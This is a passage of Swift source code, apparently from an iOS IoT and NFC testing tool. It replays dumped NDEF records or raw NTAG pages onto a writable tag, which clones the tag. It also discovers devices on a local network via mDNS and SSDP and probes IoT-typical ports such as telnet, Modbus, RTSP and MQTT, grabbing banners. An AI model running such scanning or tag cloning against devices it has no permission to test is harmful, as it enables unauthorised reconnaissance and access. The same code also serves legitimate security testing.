            if st != CoreNFC.NFCNDEFStatus.readWrite {
                self.replayBuffer.append("tag read-only — replay impossibile")
                self.finishReplay(self.replayBuffer)
                return
            }
            let records: [CoreNFC.NFCNDEFPayload] = dump.ndefHex.compactMap { hex in
                guard let d = Data(hexString: hex), !d.isEmpty else { return nil }
                return CoreNFC.NFCNDEFPayload(format: CoreNFC.NFCTypeNameFormat.unknown,
                                              type: Data(), identifier: Data(), payload: d)
            }
            if records.isEmpty {
                self.replayBuffer.append("nessun NDEF nel dump — write pages NTAG:")
                var pg: UInt8 = 4
                var wrote = 0
                func writeNext() {
                    let idx = Int(pg) - 4
                    guard idx < dump.pages.count else {
                        self.replayBuffer.append("pages written: \(wrote)")
                        self.finishReplay(self.replayBuffer)
                        return
                    }
                    guard let d = Data(hexString: dump.pages[idx]), d.count == 4 else {
                        pg += 1
                        writeNext()
                        return
                    }
                    m.sendMiFareCommand(commandPacket: Data([0xA2, pg]) + d) { result in
                        switch result {
                        case .success: wrote += 1
                        case .failure(let e): self.replayBuffer.append("write p\(pg) ERR(\((e as NSError).code))")
                        }
                        pg += 1
                        writeNext()
                    }
                }
                writeNext()
                return
            }
            let msg = NFCNDEFMessage(records: records)
            m.writeNDEF(msg) { err in
                if let err {
                    self.replayBuffer.append("NDEF write err: \(err.localizedDescription)")
                } else {
                    self.replayBuffer.append("NDEF rewritten ✓ (\(records.count) record)")
                }
                self.finishReplay(self.replayBuffer)
            }
        }
    }
}

// MARK: - Network (mDNS / SSDP / TCP-UDP probes)

final class NetScanner {
    private var browsers: [NWBrowser] = []
    private var udp: NWConnection?
    private let portTable: [UInt16] = [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100]

    func bonjour(onResult: @escaping (TargetDevice) -> Void) {
        for svc in ["_hap._tcp", "_googlecast._tcp", "_esphomelib._tcp", "_ipp._tcp", "_http._tcp"] {
            let params = NWParameters()
            params.includePeerToPeer = true
            let b = NWBrowser(for: .bonjour(type: svc, domain: "local."), using: params)
            b.browseResultsChangedHandler = { results, _ in
                for r in results {
                    guard case let .service(name, svcType, _, _) = r.endpoint else { continue }
                    _ = svcType
                    var t = TargetDevice(name: name, proto: .net, rssi: -50,
                                         mac: nil, vendor: nil, services: [svc], via: "mDNS")
                    t.extra["svc"] = svc
                    onResult(t)
                }
            }
            b.start(queue: .global())
            browsers.append(b)
        }
    }

    func stopBonjour() { browsers.forEach { $0.cancel() }; browsers.removeAll() }

    func ssdp(timeout: TimeInterval = 5, onResult: @escaping (TargetDevice) -> Void) {
        let c = NWConnection(host: "239.255.255.250", port: 1900, using: .udp)
        var found: Set<String> = []
        c.receiveMessage { [weak self] data, _, _, _ in
            if let d = data, let s = String(data: d, encoding: .utf8) {
                let loc = s.split(separator: "\n").first { $0.uppercased().contains("LOCATION:") }?
                    .split(separator: ":", maxSplits: 1).last.map { $0.trimmingCharacters(in: .whitespaces) } ?? ""
                if !loc.isEmpty, found.insert(loc).inserted {
                    var t = TargetDevice(name: "SSDP \(loc.prefix(60))", proto: .net, rssi: -50,
                                         services: ["upnp"], via: "SSDP")
                    t.extra["host"] = loc.hostPart()
                    t.extra["port"] = loc.portPart()
                    t.extra["desc"] = loc
                    onResult(t)
                }
            }
            self?.udp = c // keep alive
        }
        c.stateUpdateHandler = { st in
            if case .ready = st {
                let msg = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
                c.send(content: msg.data(using: .utf8)!, completion: .contentProcessed { _ in })
            }
        }
        c.start(queue: .global())
        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { c.cancel() }
    }

    static func portProbe(host: String, ports: [UInt16], timeout: TimeInterval = 2,
                          onOpen: @escaping (UInt16, String) -> Void, onDone: @escaping () -> Void) {
        let group = DispatchGroup()
        let sem = DispatchSemaphore(value: 6)
        DispatchQueue.global().async {
            for p in ports {
                group.enter()
                sem.wait()
                var result: (Bool, String)?
                let inner = DispatchSemaphore(value: 0)
                pokeTCP(host: host, port: p, timeout: timeout) { open, banner in
                    result = (open, banner)
                    inner.signal()
                }
                _ = inner.wait(timeout: .now() + timeout + 0.5)
                if let r = result, r.0 { onOpen(p, r.1) }
                sem.signal()
                group.leave()
            }
            onDone()
        }
    }

    static func pokeTCP(host: String, port: UInt16, timeout: TimeInterval,
                        onResult: @escaping (Bool, String) -> Void) {
        guard let p = NWEndpoint.Port(rawValue: port) else { onResult(false, ""); return }
        let c = NWConnection(host: NWEndpoint.Host(host), port: p, using: .tcp)
        var done = false
        let finish: (Bool, String) -> Void = { open, banner in
            guard !done else { return }
            done = true
            c.cancel()
            onResult(open, banner)
        }
        var received = Data()
        c.stateUpdateHandler = { st in
            switch st {
            case .ready:
                c.receive(minimumIncompleteLength: 1, maximumLength: 4096) { d, _, _, _ in
                    received += d ?? Data()
                    finish(true, String(data: received, encoding: .utf8) ?? received.hexPreview)
                }
                if received.isEmpty {
                    // give a moment for banner-less ports
                    DispatchQueue.global().asyncAfter(deadline: .now() + timeout * 0.5) {
                        finish(true, "")
                    }
                }
            case .failed, .cancelled, .waiting:
                finish(false, "")
            default: break
            }
        }
        c.start(queue: .global(qos: .utility))
        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { finish(false, "") }
    }

    static func udpPoke(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                        onReply: @escaping (String) -> Void) {
        let c = NWConnection(host: NWEndpoint.Host(host),
                             port: NWEndpoint.Port(rawValue: port)!, using: .udp)
        var done = false
        c.stateUpdateHandler = { st in
            if case .ready = st {
                c.send(content: payload, completion: .contentProcessed { _ in
                    c.receiveMessage { d, _, _, _ in
                        guard !done else { return }
                        done = true
                        let s = d.flatMap { String(data: $0, encoding: .utf8) } ?? d?.hexPreview ?? ""
                        c.cancel()
                        onReply(s)
                    }
                })
            }
        }
        c.start(queue: .global(qos: .utility))
        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) {
            if !done { done = true; c.cancel(); onReply("") }
        }
    }
}

extension String {
    func hostPart() -> String {
        guard let m = self.range(of: "//([^:/]+)", options: .regularExpression) else { return "?" }
        return String(self[m]).replacingOccurrences(of: "//", with: "")
    }
    func portPart() -> String {
        guard let m = self.range(of: ":[0-9]+", options: .regularExpression) else { return "80" }
        return String(self[m]).dropFirst().description
    }
}
